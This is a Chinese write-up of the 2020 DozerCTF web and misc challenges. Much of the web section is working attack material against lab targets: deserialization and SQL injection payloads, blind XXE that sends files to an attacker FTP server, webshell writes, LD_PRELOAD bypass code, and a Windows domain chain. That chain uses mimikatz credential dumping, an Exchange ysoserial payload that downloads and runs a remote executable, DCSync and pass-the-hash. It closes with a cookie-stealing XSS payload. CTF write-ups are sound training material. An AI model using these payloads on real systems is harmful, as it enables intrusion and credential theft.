> 原文链接: https://www.anquanke.com//post/id/209077 


# 2020 DozerCTF write UP


                                阅读量   
                                **151279**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t01dede06bf083b76ff.jpg)](https://p5.ssl.qhimg.com/t01dede06bf083b76ff.jpg)



## Web

### <a class="reference-link" name="%E7%99%BD%E7%BB%99%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"></a>白给的反序列化

<a class="reference-link" name="%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"></a>**题目描述**

不能再简单了，再简单自杀，flag在flag.php里面

<a class="reference-link" name="%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF"></a>**出题思路**

最简单的反序列化，你会发现几乎所有的限制其实都不生效，只是为了增加一点阅读代码的乐趣

<a class="reference-link" name="%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"></a>**解题思路**

根据提示只需要执行`cat flag.php`就行了

读完代码，你会发现，其实真正的限制只有这个

```
if (in_array($this-&gt;method, array("mysys"))) `{`
            call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);
        `}`
```

method变量为`mysys`就行

args变量的限制其实不生效，因为`__destruct()`，所以无论前面有没有`die()`最终`__destruct()`都会被调用，只要注意下`call_user_func_array`传入的第二个参数`$this-&gt;args`要是数组就行，可以任意命令执行。

exp：

```
&lt;?php
class home
`{`
    private $method;
    private $args;
    function __construct($method, $args)
    `{`
        $this-&gt;method = $method;
        $this-&gt;args = $args;
    `}`
    function __destruct()
    `{`
        if (in_array($this-&gt;method, array("mysys"))) `{`
            call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);
        `}`
    `}`
`}`
$a = new home('mysys',array('flag.php'));
echo urlencode(serialize($a));
?&gt;
```

生成如下payload

```
O%3A4%3A"home"%3A2%3A%7Bs%3A12%3A"%00home%00method"%3Bs%3A5%3A"mysys"%3Bs%3A10%3A"%00home%00args"%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A"flag.php"%3B%7D%7D
```

### <a class="reference-link" name="sqli-labs%200"></a>sqli-labs 0

<a class="reference-link" name="%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"></a>**题目描述**

不会吧，不会真有人不会注入吧

<a class="reference-link" name="%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF"></a>**出题思路**

网鼎杯“随便注”基础上加了转义，所以需要二次编码绕过，加入了过滤`rename、alter、union'`

<a class="reference-link" name="%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"></a>**解题思路**

通过传入参数添加二次编码的单引号`%2527`,发现报错，但是因为过滤union用不了，所以想到堆叠注入。

```
1%2527;show databases;%2523  查库名
1%2527;use security;show tables;%2523 查表名
1%2527;use security;show columns from uziuzi;%2523 查列名
```

最后查看flag，`select`被过滤了，可以预处理语句或者handler查询

handler查询

```
1%2527;handler uziuzi open as hhh;handler hhh read first;%2523
```

预处理

```
id=1%2527;sEt%2520@sql=concat(%2522sel%2522,%2522ect%2520flag%2520from%2520%2560 uziuzi%2560%2522);prepare%2520mysql%2520from%2520@sql;execute%2520mysql;
```

### <a class="reference-link" name="svgggggg%EF%BC%81"></a>svgggggg！

<a class="reference-link" name="%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"></a>**题目描述**

只求大佬门不要搅屎,求放过…

<a class="reference-link" name="%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF"></a>**出题思路**

解析svg未严格限制格式，造成blind xxe，ssrf打内网服务

<a class="reference-link" name="%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95"></a>**解题方法**

首先需要一台公网服务器，或者将本地服务转发到公网ip才能解题

先构造xxe.svg和xxe.xml

xxe.svg如下，重点在构造上半段，网上找blind xxe的payload也是可以的

```
&lt;!DOCTYPE svg [
&lt;!ELEMENT svg ANY &gt;
&lt;!ENTITY % sp SYSTEM "http://218.78.20.XXX:2122/xxe.xml"&gt;
%sp;
%param1;
]&gt;

&lt;svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red"&gt;
      &lt;text x="15" y="100" style="fill:black"&gt;XXE via SVG rasterization&lt;/text&gt;
      &lt;rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/&gt;
      &lt;flowRoot font-size="15"&gt;
         &lt;flowRegion&gt;
           &lt;rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/&gt;
         &lt;/flowRegion&gt;
         &lt;flowDiv&gt;
            &lt;flowPara&gt;&amp;exfil;&lt;/flowPara&gt;
         &lt;/flowDiv&gt;
      &lt;/flowRoot&gt;
&lt;/svg&gt;
```

xxe.xml如下

```
&lt;!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;
&lt;!ENTITY % param1 "&lt;!ENTITY exfil SYSTEM 'ftp://218.78.20.xxx:2121/%data;'&gt;"&gt;
```

我是用了github上的开源项目[xxeser](https://github.com/staaldraad/xxeserv)搭建在服务器上来比较便利的获取到Blind XXE返回的内容。接下来以xxeser为例，当然你也可以用自己的方法

将xxe.svg和xxe.xml移动到xxeser文件下自己创建的xxe-svg-xml文件夹下，并在我的服务器上开启了该服务

```
./xxeserv -w -wd ./xxe-svg-xml
```

只需要通过修改xxe.xml，再访问[http://118.31.11.216:30500/view.php?svg=http://218.78.20.xxx:2122/xxe.svg，就可以获取到想要的内容，然后就可以开始Blind](http://118.31.11.216:30500/view.php?svg=http://218.78.20.xxx:2122/xxe.svg%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96%E5%88%B0%E6%83%B3%E8%A6%81%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%BC%80%E5%A7%8BBlind) XXE之旅了

index.php和view.php都有`made with by r1ck`

读取r1ck的.bash_history

```
&lt;!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/home/r1ck/.bash_history"&gt;
&lt;!ENTITY % param1 "&lt;!ENTITY exfil SYSTEM 'ftp://218.78.20.xxx:2121/%data;'&gt;"&gt;
```

发现/app目录下起了php服务在0.0.0.0:8080

首先读取/app/index.php的源码，发现存在sql注入

```
&lt;!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/app/index.php"&gt;
&lt;!ENTITY % param1 "&lt;!ENTITY exfil SYSTEM 'ftp://218.78.20.xxx:2121/%data;'&gt;"&gt;
```

利用sql注入通过如下语句在/app目录下写入命令执行语句，这边写入shell语句注意编码url编码，hex编码都可以

url编码：

```
&lt;!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=http://127.0.0.1:8080/index.php?id=-1%27%20union%20select%201,%27%3c?php%20system($%5fGET%5bcmd%5d)%3b?%3e%27%20into%20outfile%27/app/shell.php%27%23"&gt;
&lt;!ENTITY % param1 "&lt;!ENTITY exfil SYSTEM 'ftp://218.78.20.xxx:2121/%data;'&gt;"&gt;
```

hex编码：

```
&lt;!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=http://127.0.0.1:8080/index.php?id=-1%27%20union%20select%201,0x3c3f7068702073797374656d28245f4745545b636d645d293b3f3e%20into%20outfile%27/app/shell.php%27%23"&gt;
&lt;!ENTITY % param1 "&lt;!ENTITY exfil SYSTEM 'ftp://218.78.20.xxx:2121/%data;'&gt;"&gt;
```

通过刚刚写入的文件命令执行，`ls`查看当前目录下文件，可以看到flag文件，再用相同的方法`cat`查看flag文件就行

```
&lt;!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=http://127.0.0.1:8080/shell.php?cmd=ls"&gt;
&lt;!ENTITY % param1 "&lt;!ENTITY exfil SYSTEM 'ftp://218.78.20.xxx:2121/%data;'&gt;"&gt;
```

### <a class="reference-link" name="babay%20waf"></a>babay waf

<a class="reference-link" name="%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"></a>**题目描述**

刚搭了个开源的waf-modsecurity,这样师傅们应该就没办法了吧(狗头).

<a class="reference-link" name="%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF"></a>**出题思路**

本题是实战中遇到的一个环境,本地还原了一下.主要还是在套娃,没什么新姿势.

<a class="reference-link" name="%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"></a>**解题过程**

拿到题目很显然题目是joomla cms,想办法查看版本,可以通过默认安装的语言包获得.

访问/language/en-GB/en-GB.xml获取到版本为2.5.28和hint

hint为hashcat的掩码,结合另一个hint编辑器可以找到漏洞sql注入漏洞[Joomla Component JCK Editor 6.4.4 – ‘parent’ SQL Injection](https://www.exploit-db.com/exploits/45423).

但是由于modsecurity存在,payload会被拦截.

找到[modsecurity sql注入 bypass 的方法](https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1167),构造出盲注的payload:

```
a" or `{``if`(left((select username from fqf89_users limit 0,1),1)='a')`}` -- -
```

简单盲注跑一下

```
import requests

url="http://web12138.dozerjit.club:8086/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&amp;view=menu&amp;parent="

length=len(requests.get(url+"a" or `{``if`(1=1)`}` -- -").text)
ret=""
for i in range(1,40):
    for j in range(20,128):
        payload="a" or `{``if`(ascii(substr((select password from fqf89_users limit 0,1),%s,1))=%d)`}` -- -"%(i,j)
        r=requests.get(url+payload)
        #print  payload
        if len(r.text)==length:
            ret=ret+str(chr(j))
            print ret
```

在有其他用户注册的情况下,还有师傅用报错得到了hash…

不是很明白users表只有一条数据的时候为什么不行..机缘巧合之下题目难度被降低了…

```
1 " and`{``if`updatexml(1,concat(0x3a,(select /*!50000(((password))) from/*!50000fqf89_users*/ limit 1,1)),1)`}`#
```

对hash进行破解:

```
hashcat.exe -a 3 -m 400 '$P$DTCPSnZSPuO1eZWjIqKm0CZFe8/GgY0' ?u?d?a?d?a?
```

得到明文密码D0z3r,进入后台通过上传语言包getshell.

一般的一句话木马流量特征会被检测到,使用冰蝎即可绕过流量检测.发现开启了disable_functions,使用ld_preload绕过即可执行搜索命令.

```
#include&lt;stdlib.h&gt;
#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
void payload()`{`
system("grep -nR "Dozerctf" /var/www/html &gt; /var/www/html/language/result.txt");
`}` 
int geteuid()`{`
if(getenv("LD_PRELOAD") ==NULL) `{`
return 0;`}`
unsetenv("LD_PRELOAD");
payload();
`}`
```

编译

```
root@ubuntu:~# gcc -c -fPIC a.c -o a
root@ubuntu:~# gcc -shared a -o a.so
```

编写php:

```
&lt;?php
   putenv("LD_PRELOAD=/var/www/html/a.so");
   mail("[email protected]","","","","");
?&gt;
```

上传并执行,获取flag:

```
/var/www/html/modules/mod_finder/helper.php:90:/*Dozerctf`{`da6776e7ec7eaa7a6f3df5c6b149127em`}`*/
Binary file /var/www/html/a.so matches
```

### <a class="reference-link" name="%E7%AE%80%E5%8D%95%E5%9F%9F%E6%B8%97%E9%80%8F"></a>简单域渗透

<a class="reference-link" name="%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"></a>**题目描述**

都是最基础redteam技能…大佬门不要搅屎,求放过…

<a class="reference-link" name="%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF"></a>**出题思路**

想出个简单的域环境,尽量多的涵盖一些redteam技能,要陪女朋友(其实就是懒),所以就只出了三个机器,知识点也不是很多.

很多东西没涉及到,如简单的横向移动(wmic,schtasks,winrs等),个人机上的一些信息的获取(firefox,chrome凭证,windows凭据管理器等),本地提权(juicy photo,exp),域提权(gpp,14068,ntlm relaty等)等等等等.

杀软随便找了个360(主要是免费),直接给了师傅们本机管理员等等都降低了难度,和实战的环境相差比较多.

环境会由学弟打包共享给大家,大家可以进一步充实这个环境.

比较推荐的红队wiki:ired.team

<a class="reference-link" name="%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"></a>**解题过程**

外网是一个liferay,结合之前的cve-2020-7961可以直接rce.这里环境没有为难大家,直接是可以出网的机器,可以直接使用certutil下载荷载或者webshell进行内网渗透,否则还需要构造不出网的exp.

出网的exp可以直接使用[CVE-2020-7961](https://github.com/b33p-b0x/CVE-2020-7961-payloads)

先将.java编译成字节码.class:

```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
public class LifExp `{`

static `{`

try `{`
            String[] cmd = `{`"cmd.exe", "/c", "whoami"`}`;
            Process process=java.lang.Runtime.getRuntime().exec(cmd);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String s= stdInput.readLine();
            String[] cmd2 = `{`"cmd.exe", "/c", "certutil.exe -urlcache -split -f http://vps/"+s+""`}`;
            java.lang.Runtime.getRuntime().exec(cmd2);
        `}` catch ( Exception e ) `{`
            e.printStackTrace();
        `}`
`}`
`}`
```

编译:

```
javac LifExp.java
```

启动脚本:

```
python poc.py -t http://web1616.dozerjit.club:8086 -l vps -p 8080
```

这里有坑,vps地址不能填0.0.0.0,这里的地址有两个作用.一是作为vps webserver的监听的地址,二是会被写进payload,作为目标请求远程payload的地址.

将poc中webserver监听相关的注释,-l 为vps公网地址.手动启动SimpleHTTPServer 监听0.0.0.0.

(手动构造反序列化payload的师傅不会遇到这些问题)

确认漏洞存在后,使用cs或msf等工具生成的exe会被杀,确认一下杀软:

```
tasklist /svc
dir c:progra~1
dir c:progra~2
```

发现是360,师傅们可以选择c2的荷载免杀来绕过,这里我们进行曲线救国,不使用c2进行内网渗透.找个目录放websll即可.

(有些师傅powershell能弹shell之后又不行了是360的问题)

在桌面上找到第一个flag:

```
Dozerctf`{`a993e8ce377e05b2cbfa460e43e43757`}`
```

进行简单的域内信息搜集,列出域信任关系

```
nltest /domain_trusts
```

环境为单域,查看ip信息,一般dns服务器就是dc:

```
ipconfig /all
```

获得当前机器的hash:

```
reg save hklmsam sam
reg save hklmsystem system

mimikatz # lsadump::sam /sam:sam /system:system
Domain : DOZER-DMZ01
SysKey : f443141fcbd9a35c64370d36a05f8e70
Local SID : S-1-5-21-1495210691-4001662545-2502461571

SAMKey : 5f0f962fafd8bc2a549097e62597e6bc

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000001f5 (501)
User : Guest

RID  : 000003e9 (1001)
User : root
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42
    lm  - 0: 4364da8b9c9e89eff083dc130b360e4b
    ntlm- 0: e19ccf75ee54e06b06a5907af13cef42
    ntlm- 1: 1aface37f4f4843d3f534c73716b9a7e
```

得到本地管理员hash,破解明文为P[@ssw0rd](https://github.com/ssw0rd),查看c盘用户目录发现最近有shark用户登陆过,可以通过systeminfo的启动时间和目录修改时间进行对比,一般目录修改时间晚于重启时间才能在内存里抓到这个用户.

(因为有hxd搅屎的缘故,机器重启了,忘记登陆了,中间内存出了点问题,shark的hash有一段时间是错的)

转储内存抓域凭证:

```
procdump64.exe -ma -accepteula lsass.exe 1.dmp 或者 rundll32.exe C:windowsSystem32comsvcs.dll, MiniDump 560 C:programdata1.dmp full

mimikatz # sekurlsa::minidump lass.dmp
Switch to MINIDUMP : 'lass.dmp'
mimikatz # sekurlsa::logonpasswords
```

获取到了一个域用户shark的密码,依然是P[@ssw0rd](https://github.com/ssw0rd). 其实就算不抓内存有经验的师傅也会想到用本机密码试一试,如何试比较简单的方式就是连一下自己的共享

```
net use \127.0.0.1 /user:dozershark "P@ssw0rd"
```

接下来就是域内信息搜集,使用dsquery去导出域信息.

```
dsquery * /s 10.10.10.3 /u shark /p P@ssw0rd -attr * -limit 0 &gt; 1.txt
```

域信息是ldap结构的,dsquery导出的其实和net user /domain 等命令执行是一样的.

在用户信息里搜索到第二个flag:

```
cn: flagflag
sn: flag
distinguishedName: CN=flagflag,CN=Users,DC=dozer,DC=org
instanceType: 4
whenCreated: 05/16/2020 17:35:13
whenChanged: 05/16/2020 17:37:11
displayName: flag
uSNCreated: 38671
uSNChanged: 38683
company: Dozerctf`{`3fed7db7fee7a1771b58d309bf9ca851`}`
```

同时发现组内有exchange服务器

```
member: CN=Exchange Install Domain Servers,CN=Microsoft Exchange System Objects,DC=dozer,DC=org
member: CN=DOZER-EXCHANGE,CN=Computers,DC=dozer,DC=org
```

使用regeorg代理进内网(方式很多,甚至还有师傅frp了rdp)

```
python reGeorgSocksProxy.py -u http://web1616.dozerjit.club:8086/errors/tunnel.jsp -l 0.0.0.0 -p 1081
```

访问[https://dozer-exchange.dozer.org](https://dozer-exchange.dozer.org)

已知一个域内普通账户和exchange,熟悉ad的话很容易想到cve-2020-0688(这里exchange ssrf应该也是存在的,结合ntlm relay 也是一种思路).先看看这个邮箱账户等不能登陆.

在mailbox里获取到第三个flag.

```
Dozerctf`{`9b35c916c37b00f3359d49b6c9c99667`}`
```

cve2020-0688 github几个漏洞工具都无法执行命令,匹配session的地方有问题,手工生成payload获取到exchange权限.

```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "ping mydatahere.2d5facd857db3251fd2c.d.zhack.ca" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="B97B4E27" --viewstateuserkey="d5413748-06a2-4774-8b8a-515ddaf5f383" --isdebug -islegacy
```

详情参考:[https://www.freebuf.com/vuls/228681.html](https://www.freebuf.com/vuls/228681.html)

这台机器上没有360,直接使用c2方便执行命令.当然也可以在excheng的owa/auth目录或者exp/auth目录放shell,默认是system权限,在root用户桌面上找到第四个flag

```
certutil.exe -urlcache -split -f "http://39.97.163.55:8080/1.exe" c:windowstemp1.exe &amp;&amp; 1.exe
```

```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "certutil.exe -urlcache -split -f "http://39.97.163.55:8080/1.exe" c:windowstemp1.exe &amp;&amp; c:windowstemp1.exe" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="B97B4E27" --viewstateuserkey="d5413748-06a2-4774-8b8a-515ddaf5f383" --isdebug -islegacy
```

访问:

```
https://10.10.10.4/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&amp;__VIEWSTATE=%2fwEygggAAQAAAP%2f%2f%2f%2f8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAACkBjw%2feG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8%2bDQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBjZXJ0dXRpbC5leGUgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vMzkuOTcuMTYzLjU1OjgwODAvMS5leGUgYzpcd2luZG93c1x0ZW1wXDEuZXhlICZhbXA7JmFtcDsgYzpcd2luZG93c1x0ZW1wXDEuZXhlIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8%2bDQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsMDg4FT7ljhPqGSZN4Nls5Uth%2bCw%3D%3D
```

```
Dozerctf`{`1193173239563ee49664b5e500f687ba`}`
```

尝试在exchange上抓hash,如果域管登过且没重启就可以拿到域管hash,如果没有则利用exchange writeacl 给普通用户dcsync的权限,去同步域管的hash.

具体可以参考:[域渗透——使用Exchange服务器中特定的ACL实现域提权](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%89%B9%E5%AE%9A%E7%9A%84ACL%E5%AE%9E%E7%8E%B0%E5%9F%9F%E6%8F%90%E6%9D%83/)

首先在导出的域信息里找到Exchange Trusted Subsystem组的dn:

```
CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=dozer,DC=org
```

添加shark用户对exchange组的完全访问权限.

```
$RawObject = Get-DomainObject -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=dozer,DC=org" -Raw
$TargetObject = $RawObject.GetDirectoryEntry()
$ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity shark -Right AccessSystemSecurity,CreateChild,Delete,DeleteChild,DeleteTree,ExtendedRight,GenericAll,GenericExecute,GenericRead,GenericWrite,ListChildren,ListObject,ReadControl,ReadProperty,Self,Synchronize,WriteDacl,WriteOwner,WriteProperty
$TargetObject.PsBase.ObjectSecurity.AddAccessRule($ACE)
$TargetObject.PsBase.CommitChanges()
```

将shark加入Exchange Trusted Subsystem组

```
import-module .Microsoft.ActiveDirectory.Management.dll
Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members shark
```

至此shark具有了dcsync的权限,我们网络是通的并且有密码,可以直接在本地dcsync或者上传mimikatz到exchange上同步:

首先先添加凭证,再同步hash

```
cmdkey /add:dozer-dc.dozer.org /user:shark /pass:P@ssw0rd

lsadump::dcsync /domain:dozer /dc:dozer-dc /all
```

获得域管hash后无法破解,在本地使用mimikatz pth 横向移动到dc上.

```
privilege::debug
sekurlsa::pth /user:administator /domain:dozer /ntlm:4aefab3403a99c6037fbe7f382a881f6
```

查看管理员桌面得到第五个flag:

```
type \10.10.10.3c$usersadministratordesktopflag.txt
```

Dozerctf`{`9e81075297066f2275ba49ede1cbe3cc`}`

### <a class="reference-link" name="fake%20phpminiadmin"></a>fake phpminiadmin

<a class="reference-link" name="%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"></a>**题目描述**

山寨phpminiadmin

<a class="reference-link" name="%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF"></a>**出题思路**

福利题,简化了2018巅峰极客L3m0n师傅出的题目.

<a class="reference-link" name="%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"></a>**解题过程**

执行sql语句处利用hex可以进行xss,结合contact功能处的csrf可以组合利用.

```
select 0x3c7363726970743e616c6572742831293c2f7363726970743e
```

成功弹窗

生成csrf payload

```
&lt;html&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
    &lt;form action="http://xxx/sql.php" method="POST"&gt;
      &lt;input type="hidden" name="sql" value="select 0x...." /&gt;
    &lt;/form&gt;
    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
```

编码前的xss payload为:

```
&lt;script&gt;self.location = 'http://vps/?v=aaa'+btoa(document.cookie)+'aaa';&lt;/script&gt;
```

将csrf的payload放在vps上,在contact处提交vps上payload的地址.

在放payload的vps上发现referer是后台地址,访问提示需要登陆地点错误.

修改payload后读取后台源码获得flag.

```
&lt;html&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
    &lt;form action="http://127.0.0.1/sql.php" method="POST"&gt;
      &lt;input type="hidden" name="sql" value="select 0x...." /&gt;
    &lt;/form&gt;
    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
```

使用xss平台等方式读取:

```
var u = 'http://vps/';
var cr;
if (document.charset) `{`
        cr = document.charset
`}` else if (document.characterSet) `{`
        cr = document.characterSet
`}`;
function createXmlHttp() `{`
        if (window.XMLHttpRequest) `{`
                    xmlHttp = new XMLHttpRequest()
                `}` else `{`
                        var MSXML = new Array('MSXML2.XMLHTTP.5.0', 'MSXML2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP', 'Microsoft.XMLHTTP');
                        for (var n = 0; n &lt; MSXML.length; n++) `{`
                                    try `{`
                                                    xmlHttp = new ActiveXObject(MSXML[n]);
                                                    break
                                                `}` catch(e) `{``}`
                                `}`
                    `}`
`}`
createXmlHttp();
xmlHttp.onreadystatechange = writeSource;
xmlHttp.open("GET", "http://127.0.0.1/admin_shark.php", true);
xmlHttp.send(null);     
function postSource(cc) `{`
        url = u;
        cc = "mycode=" + escape(cc);
        window.location.href =u+cc;
`}`
function writeSource() `{`
        if (xmlHttp.readyState == 4) `{`
                    var c = new postSource(xmlHttp.responseText)
                `}`
`}`
```

获取到flag:

```
Dozerctf`{`eed8cdc400dfd4ec85dff70a170066b7`}`
```



## Misc

### <a class="reference-link" name="%E5%A4%8F%E6%97%A5%E8%AE%A1%E5%88%92"></a>夏日计划

LSB发现是假flag

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b550a216da60b906.jpg)

foremost得到假flag

[![](https://p3.ssl.qhimg.com/t01d9f9c3a5c8cbcc69.jpg)](https://p3.ssl.qhimg.com/t01d9f9c3a5c8cbcc69.jpg)

[![](https://p1.ssl.qhimg.com/t016211a6df5bd0203a.png)](https://p1.ssl.qhimg.com/t016211a6df5bd0203a.png)

取出txt中隐藏的NTFS数据流，将取出的文件合成一个文件。

[![](https://p3.ssl.qhimg.com/t010e5056dd3d134510.jpg)](https://p3.ssl.qhimg.com/t010e5056dd3d134510.jpg)

导出rar，伪加密将4改0

[![](https://p2.ssl.qhimg.com/t01ab55291838036acb.jpg)](https://p2.ssl.qhimg.com/t01ab55291838036acb.jpg)

将里面文件4合1

[![](https://p1.ssl.qhimg.com/t01ac5a1a0750d082d5.png)](https://p1.ssl.qhimg.com/t01ac5a1a0750d082d5.png)

将文档里的坐标转化为图片

[![](https://p0.ssl.qhimg.com/t01bdef0af6e0ac4a5e.jpg)](https://p0.ssl.qhimg.com/t01bdef0af6e0ac4a5e.jpg)

[![](https://p4.ssl.qhimg.com/t01b5115c2b27f56d7b.jpg)](https://p4.ssl.qhimg.com/t01b5115c2b27f56d7b.jpg)

最终得到一个汉信码扫码可得flag

[![](https://p3.ssl.qhimg.com/t01e5d7f7601e578489.jpg)](https://p3.ssl.qhimg.com/t01e5d7f7601e578489.jpg)

[![](https://p2.ssl.qhimg.com/t01e29d43d789eef7bb.jpg)](https://p2.ssl.qhimg.com/t01e29d43d789eef7bb.jpg)

flag：Dozerctf`{` Congratulations_U_find_it`}`

### <a class="reference-link" name="easy_analysis"></a>easy_analysis

注：此处volatility使用windows版，linux自行修改命令

使用volatility.exe -f memory imageinfo判断系统，猜测为win7SP1X64

[![](https://p4.ssl.qhimg.com/t0172c12b3b9c41a347.jpg)](https://p4.ssl.qhimg.com/t0172c12b3b9c41a347.jpg)

volatility.exe -f memory —profile=Win7SP1x64 pslist查看进程

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0170122e21ac0de081.jpg)

使用volatility.exe -f memory —profile=Win7SP1x64 cmdscan查看命令行记录，发现flag文件夹。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t017695fda2be836911.png)

